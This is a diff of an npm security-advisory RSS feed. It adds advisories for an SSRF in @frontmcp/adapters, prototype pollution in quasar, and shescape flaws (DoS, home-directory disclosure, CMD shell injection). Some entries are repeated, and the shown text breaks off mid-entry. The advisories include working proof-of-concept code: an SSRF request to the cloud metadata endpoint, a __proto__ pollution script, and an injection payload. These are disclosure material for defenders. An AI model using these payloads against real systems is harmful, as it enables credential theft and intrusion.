@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-24T21:53:59.496Z</updated>
+    <updated>2026-07-24T22:51:45.069Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,890 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@frontmcp/adapters] FrontMCP: Server-Side Request Forgery (SSRF) in the OpenAPI adapter spec-change poller]]></title>
+        <id>https://github.com/advisories/GHSA-8q49-2h5h-434x</id>
+        <link href="https://github.com/advisories/GHSA-8q49-2h5h-434x"/>
+        <updated>2026-07-24T22:40:00.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The OpenAPI adapter's spec-change <strong>poller</strong> (<code>OpenApiSpecPoller</code>) re-fetched the
+configured spec <code>url</code> on a timer using a raw global <code>fetch()</code>, bypassing the SSRF
+guard (<code>safeFetch</code> / <code>assertUrlSafe</code>) that <code>OpenAPIToolGenerator.fromURL()</code> applies
+to the initial spec load. As a result, the pinning/DNS-resolution hardening delivered
+via <code>mcp-from-openapi &gt;= 2.5.0</code> (advisory GHSA-65h7-9wrw-629c) protected the initial
+load but <strong>not</strong> the recurring poll of the same URL. When polling is enabled against
+an untrusted or attacker-influenceable spec URL, this is an unguarded SSRF vector.</p>
+<h2 id="details">Details</h2>
+<p>The initial spec load is guarded. <code>OpenapiAdapter</code> resolves a secure <code>refResolution</code>
+policy and passes it to the guarded loader:</p>
+<pre><code class="language-ts">// libs/adapters/src/openapi/openapi.adapter.ts — initializeGenerator()
+return await OpenAPIToolGenerator.fromURL(this.options.url, {
+  // ...
+  followRedirects: this.options.loadOptions?.followRedirects ?? false,
+  refResolution, // secure default: external $refs off, internal targets blocked
+});
+</code></pre>
+<p>But the poller — which re-fetches <strong>the same URL</strong> on every interval — did not:</p>
+<pre><code class="language-ts">// libs/adapters/src/openapi/openapi-spec-poller.ts — doFetch() (vulnerable, &lt;= 1.5.5)
+const controller = new AbortController();
+const timeout = setTimeout(() =&gt; controller.abort(), this.fetchTimeoutMs);
+try {
+  const response = await fetch(this.url, {   // &lt;-- raw global fetch, no SSRF guard
+    headers,
+    signal: controller.signal,
+  });
+  // ...hash the body, fire onChanged...
+}
+</code></pre>
+<p>Because <code>doFetch()</code> never called <code>safeFetch</code>, none of the guard's protections applied
+to the polled request:</p>
+<ul>
+<li>no allow-list / block-list enforcement (<code>allowedHosts</code> / <code>blockedHosts</code>);</li>
+<li>no internal/private/loopback/link-local/CGNAT/cloud-metadata IP blocking;</li>
+<li>no DNS resolution of the hostname (so a DNS name that resolves to an internal IP,
+e.g. <code>http://127.0.0.1.nip.io/</code>, was reached);</li>
+<li>no connection <strong>pinning</strong> to the validated IP (DNS-rebinding TOCTOU);</li>
+<li>no per-hop re-validation of HTTP redirects.</li>
+</ul>
+<p>This is the identical threat model to <code>fromURL()</code> / external <code>$ref</code> resolution
+(GHSA-65h7-9wrw-629c), applied to a request path that the fix for that advisory did
+not cover.</p>
+<h2 id="impact">Impact</h2>
+<p>A server that enables spec polling against an untrusted or attacker-influenceable
+spec URL will, on every poll interval, issue a server-side <code>GET</code> to whatever host the
+URL (or a DNS name it resolves to, or a redirect it returns) points at — including
+internal-only addresses unreachable from the public internet. Consequences include:</p>
+<ul>
+<li>reading cloud-instance metadata endpoints (e.g. <code>169.254.169.254</code>) — credential /
+token theft;</li>
+<li>probing and reaching internal services and private-range hosts (internal network
+scanning);</li>
+<li>DNS-rebinding to swap a public host for an internal one between validation and
+connection.</li>
+</ul>
+<p>The poller issues <code>GET</code> requests only, so the primary impact is <strong>confidentiality</strong>
+(reaching and reading internal endpoints); the fetched body is content-hashed to
+detect change and the subsequent tool rebuild goes back through the guarded
+<code>fromURL()</code> path.</p>
+<h2 id="preconditions">Preconditions</h2>
+<p>Exploitation requires <strong>both</strong>:</p>
+<ol>
+<li><code>polling.enabled: true</code> on an <code>OpenapiAdapter</code> (polling is off by default and
+requires the URL-based <code>url</code> option, not an inline <code>spec</code>); <strong>and</strong></li>
+<li>the spec <code>url</code> is untrusted / attacker-influenceable (e.g. it is derived from user
+input, a tenant-supplied value, or otherwise not a fixed trusted constant), or an
+otherwise-trusted spec host is attacker-controlled or can redirect.</li>
+</ol>
+<p>Servers that poll a fixed, trusted, first-party spec URL are not exposed in practice,
+though they still benefit from the guard as defense-in-depth.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<pre><code class="language-ts">import { OpenapiAdapter } from '@frontmcp/adapters';
+
+// url is attacker-influenceable and points (directly, via DNS, or via redirect)
+// at an internal target; polling re-fetches it every interval.
+const adapter = OpenapiAdapter.init({
+  name: 'evil',
+  url: 'http://169.254.169.254/latest/meta-data/', // or http://127.0.0.1.nip.io/...
+  polling: { enabled: true, intervalMs: 5000 },
+});
+
+await adapter.fetch();   // initial load IS guarded (blocked)
+adapter.startPolling();  // &lt;= 1.5.5: each poll issues an UNGUARDED GET to the internal target
+</code></pre>
+<p>On <code>&lt;= 1.5.5</code> the timed poll reaches the internal address. On the patched version the
+poll fails closed (no request is made; the failure is logged) exactly as the initial
+load does.</p>
+<h2 id="patch">Patch</h2>
+<p>The fix routes the poller through the same SSRF guard as the initial load, with the
+same policy, so both paths share one DNS resolution + connection pinning and cannot
+diverge:</p>
+<ul>
+<li><code>OpenApiSpecPoller.doFetch()</code> now calls <code>safeFetch(this.url, { headers, timeoutMs, followRedirects, ssrf })</code> from <code>mcp-from-openapi</code> instead of the global <code>fetch()</code>.</li>
+<li><code>OpenapiAdapter.startPolling()</code> injects the adapter's resolved policy into the
+poller: <code>ssrf: normalizeSsrfOptions(this.resolveRefResolution())</code> and
+<code>followRedirects: loadOptions?.followRedirects ?? false</code> — identical to what
+<code>fromURL()</code> receives.</li>
+<li><code>SpecPollerOptions</code> gained optional <code>ssrf</code> / <code>followRedirects</code>; standalone use of
+<code>OpenApiSpecPoller</code> defaults to the secure policy (internal targets blocked,
+redirects not followed).</li>
+</ul>
+<p>Files changed:</p>
+<ul>
+<li><code>libs/adapters/src/openapi/openapi-spec-poller.ts</code></li>
+<li><code>libs/adapters/src/openapi/openapi-spec-poller.types.ts</code></li>
+<li><code>libs/adapters/src/openapi/openapi.adapter.ts</code></li>
+</ul>
+<p>Requires <code>mcp-from-openapi &gt;= 2.5.0</code> (already a dependency at <code>2.5.1</code>), which exports
+<code>safeFetch</code> / <code>normalizeSsrfOptions</code> and performs the resolved-IP validation and
+connection pinning.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Upgrade <code>@frontmcp/adapters</code> to <code>1.5.6</code> or later. No configuration change is required:
+polling now inherits the same secure defaults as the initial spec load (external
+targets blocked, redirects not followed). To poll a genuinely internal or localhost
+spec server in a trusted environment, opt in explicitly with
+<code>loadOptions.refResolution.allowInternalIPs: true</code> — the same knob that gates the
+initial load.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>For users who cannot upgrade immediately:</p>
+<ul>
+<li>disable polling (<code>polling.enabled: false</code>) on adapters whose spec <code>url</code> is not a
+fixed, trusted, first-party value; or</li>
+<li>only enable polling against spec URLs you fully control, served over HTTPS from a
+host that cannot be made to redirect to internal targets; and</li>
+<li>enforce network egress controls / an allow-list at the platform layer so the server
+cannot reach internal ranges or cloud-metadata endpoints.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/agentfront/frontmcp/security/advisories/GHSA-8q49-2h5h-434x">https://github.com/agentfront/frontmcp/security/advisories/GHSA-8q49-2h5h-434x</a></li>
+<li><a href="https://github.com/agentfront/frontmcp/pull/510">https://github.com/agentfront/frontmcp/pull/510</a></li>
+<li><a href="https://github.com/agentfront/frontmcp/commit/077201e109bf6f45dbc85c36d6bd77ded18ab13e">https://github.com/agentfront/frontmcp/commit/077201e109bf6f45dbc85c36d6bd77ded18ab13e</a></li>
+<li><a href="https://github.com/agentfront/frontmcp/releases/tag/v1.5.6">https://github.com/agentfront/frontmcp/releases/tag/v1.5.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-8q49-2h5h-434x">https://github.com/advisories/GHSA-8q49-2h5h-434x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8q49-2h5h-434x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T22:40:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[quasar] Quasar: Prototype pollution in the extend() utility]]></title>
+        <id>https://github.com/advisories/GHSA-3r53-75j5-3g7j</id>
+        <link href="https://github.com/advisories/GHSA-3r53-75j5-3g7j"/>
+        <updated>2026-07-24T22:36:47.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>quasar@2.20.1</code>, the latest published version at the time of testing, appears to be vulnerable to prototype pollution through the public <code>extend()</code> utility exported from the package root.</p>
+<p>When <code>extend(true, target, source)</code> is used for a deep merge, attacker-controlled object keys are recursively copied into the target object without blocking prototype-pollution primitives such as <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code>.</p>
+<p>This can allow attacker-controlled properties to be written to <code>Object.prototype</code>.</p>
+<h3 id="details">Details</h3>
+<p>Affected source:</p>
+<pre><code class="language-text">src/utils/extend/extend.js
+</code></pre>
+<p>Distributed files include:</p>
+<pre><code class="language-text">dist/quasar.server.prod.js
+dist/quasar.server.prod.cjs
+dist/quasar.client.js
+</code></pre>
+<p>The package root publicly exports <code>extend</code>. During deep merge, source object keys are recursively assigned into the target object. If the source object contains an own <code>__proto__</code> property, the merge can descend into the prototype object and assign attacker-controlled properties onto <code>Object.prototype</code>.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-bash">rm -rf /tmp/quasar-extend-pp-poc
+mkdir /tmp/quasar-extend-pp-poc
+cd /tmp/quasar-extend-pp-poc
+
+npm init -y &gt;/dev/null
+npm install quasar@2.20.1 vue@3.5.31 &gt;/dev/null
+
+cat &gt; hack.mjs &lt;&lt;'JS'
+import { extend } from 'quasar';
+
+delete Object.prototype.polluted;
+
+extend(true, {}, {
+  ['__proto__']: {
+    polluted: 'yes'
+  }
+});
+
+console.log(({}).polluted);
+
+delete Object.prototype.polluted;
+JS
+
+node ./hack.mjs
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">yes
+</code></pre>
+<p>Expected output:</p>
+<pre><code class="language-text">undefined
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a prototype pollution vulnerability.</p>
+<p>If an application passes user-controlled or partially user-controlled objects into <code>extend(true, ...)</code>, an attacker may be able to pollute <code>Object.prototype</code> in the same JavaScript process.</p>
+<p>Depending on how the polluted property is later consumed, this may lead to logic bypass, unsafe default option injection, denial of service, or other application-specific security impact.</p>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Reject or safely ignore dangerous keys before assignment, including:</p>
+<pre><code class="language-text">__proto__
+prototype
+constructor
+</code></pre>
+<p>The merge implementation should also avoid descending into prototype-related properties during recursive merge.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/quasarframework/quasar/security/advisories/GHSA-3r53-75j5-3g7j">https://github.com/quasarframework/quasar/security/advisories/GHSA-3r53-75j5-3g7j</a></li>
+<li><a href="https://github.com/quasarframework/quasar/commit/d0a95d95ab3c29d13e1b8ba8c5e5025fd6ce35e7">https://github.com/quasarframework/quasar/commit/d0a95d95ab3c29d13e1b8ba8c5e5025fd6ce35e7</a></li>
+<li><a href="https://github.com/quasarframework/quasar/releases/tag/quasar-v2.22.0">https://github.com/quasarframework/quasar/releases/tag/quasar-v2.22.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-3r53-75j5-3g7j">https://github.com/advisories/GHSA-3r53-75j5-3g7j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3r53-75j5-3g7j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T22:36:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Quadratic-time denial of service in the flag-protection]]></title>
+        <id>https://github.com/advisories/GHSA-gm3r-q2wp-hw87</id>
+        <link href="https://github.com/advisories/GHSA-gm3r-q2wp-hw87"/>
+        <updated>2026-07-24T22:35:09.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape that have flag protection enabled, which is on by default, regardless of the API being used.</p>
+<p>An attacker can cause a runtime quadratic in the input size, causing denial of service for large inputs.</p>
+<pre><code class="language-javascript">import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    //flagProtection unspecified
+    // Or
+    flagProtection: true,
+};
+
+// 2. Payload
+let payload = "\u0000-".repeat(32000);
+
+// 3. Usage
+const shescape = new Shescape(options);
+let callback;
+
+callback = () =&gt; shescape.escape(payload);
+// Or
+callback = () =&gt; shescape.escapeAll([payload]);
+// Or
+callback = () =&gt; shescape.quote(payload);
+// Or
+callback = () =&gt; shescape.quoteAll([payload]);
+
+const t0 = process.hrtime.bigint();
+callback();
+const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+
+// 4. Impact
+console.log("Duration:", ms);
+// Outputs "Duration:" followed by a number close to 20000
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can 1) put restrictions on the length of untrusted input or 2) strip all content before the <strong>last</strong> <code>-</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-gm3r-q2wp-hw87">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-gm3r-q2wp-hw87</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-gm3r-q2wp-hw87">https://github.com/advisories/GHSA-gm3r-q2wp-hw87</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gm3r-q2wp-hw87</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T22:35:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Quadratic-time denial of service in the flag-protection]]></title>
+        <id>https://github.com/advisories/GHSA-gm3r-q2wp-hw87</id>
+        <link href="https://github.com/advisories/GHSA-gm3r-q2wp-hw87"/>
+        <updated>2026-07-24T22:35:09.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape that have flag protection enabled, which is on by default, regardless of the API being used.</p>
+<p>An attacker can cause a runtime quadratic in the input size, causing denial of service for large inputs.</p>
+<pre><code class="language-javascript">import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    //flagProtection unspecified
+    // Or
+    flagProtection: true,
+};
+
+// 2. Payload
+let payload = "\u0000-".repeat(32000);
+
+// 3. Usage
+const shescape = new Shescape(options);
+let callback;
+
+callback = () =&gt; shescape.escape(payload);
+// Or
+callback = () =&gt; shescape.escapeAll([payload]);
+// Or
+callback = () =&gt; shescape.quote(payload);
+// Or
+callback = () =&gt; shescape.quoteAll([payload]);
+
+const t0 = process.hrtime.bigint();
+callback();
+const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+
+// 4. Impact
+console.log("Duration:", ms);
+// Outputs "Duration:" followed by a number close to 20000
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can 1) put restrictions on the length of untrusted input or 2) strip all content before the <strong>last</strong> <code>-</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-gm3r-q2wp-hw87">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-gm3r-q2wp-hw87</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-gm3r-q2wp-hw87">https://github.com/advisories/GHSA-gm3r-q2wp-hw87</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gm3r-q2wp-hw87</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T22:35:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Home-directory disclosure in assignment context on Unix with Dash]]></title>
+        <id>https://github.com/advisories/GHSA-q53c-4prm-w95q</id>
+        <link href="https://github.com/advisories/GHSA-q53c-4prm-w95q"/>
+        <updated>2026-07-24T22:34:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape on Unix systems that explicitly configure <code>shell</code> to Dash, or <code>true</code> when the default shell is Dash, using the <code>escape</code> and <code>escapeAll</code> APIs in assignments prefixed to a command.</p>
+<p>An attacker may be able to obtain the location of the home directory and, depending on how it is used, change the location on which a command operates in unexpected ways.</p>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "dash",
+    // Or
+    shell: true, // Only if the default shell is Dash
+};
+
+// 2. Payload
+const payload = ":~";
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload);
+// Or
+escapedPayload = shescape.escapeAll([payload]);
+
+// And (example)
+const result = cp.execSync(`V=${escapedPayload}; echo $V`, options);
+
+// 4. Impact
+console.log(result.toString());
+// Outputs ":" followed by the user's home directory
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can 1) refrain from using Dash, 2) use the <code>env</code> option of the <code>node:child_process</code> API to inject variables with untrusted values instead, or 3) remove all instances of <code>~</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-q53c-4prm-w95q">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-q53c-4prm-w95q</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-q53c-4prm-w95q">https://github.com/advisories/GHSA-q53c-4prm-w95q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q53c-4prm-w95q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T22:34:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Home-directory disclosure in assignment context on Unix with Dash]]></title>
+        <id>https://github.com/advisories/GHSA-q53c-4prm-w95q</id>
+        <link href="https://github.com/advisories/GHSA-q53c-4prm-w95q"/>
+        <updated>2026-07-24T22:34:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape on Unix systems that explicitly configure <code>shell</code> to Dash, or <code>true</code> when the default shell is Dash, using the <code>escape</code> and <code>escapeAll</code> APIs in assignments prefixed to a command.</p>
+<p>An attacker may be able to obtain the location of the home directory and, depending on how it is used, change the location on which a command operates in unexpected ways.</p>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "dash",
+    // Or
+    shell: true, // Only if the default shell is Dash
+};
+
+// 2. Payload
+const payload = ":~";
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload);
+// Or
+escapedPayload = shescape.escapeAll([payload]);
+
+// And (example)
+const result = cp.execSync(`V=${escapedPayload}; echo $V`, options);
+
+// 4. Impact
+console.log(result.toString());
+// Outputs ":" followed by the user's home directory
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can 1) refrain from using Dash, 2) use the <code>env</code> option of the <code>node:child_process</code> API to inject variables with untrusted values instead, or 3) remove all instances of <code>~</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-q53c-4prm-w95q">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-q53c-4prm-w95q</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-q53c-4prm-w95q">https://github.com/advisories/GHSA-q53c-4prm-w95q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q53c-4prm-w95q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T22:34:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Shell injection via unescaped parentheses on Windows with CMD]]></title>
+        <id>https://github.com/advisories/GHSA-w4hw-qcx7-56pr</id>
+        <link href="https://github.com/advisories/GHSA-w4hw-qcx7-56pr"/>
+        <updated>2026-07-24T22:34:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape on Windows that explicitly configure <code>shell</code> to CMD, or <code>true</code> with the default shell being CMD, using the <code>escape</code> and <code>escapeAll</code> APIs.</p>
+<p>An attacker may be able to achieve shell injection depending on the original command.</p>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "cmd.exe",
+    // Or
+    shell: true, // Only if the default shell is CMD
+};
+
+// 2. Payload
+const payload = "x) else if a==a (echo y";
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload);
+// Or
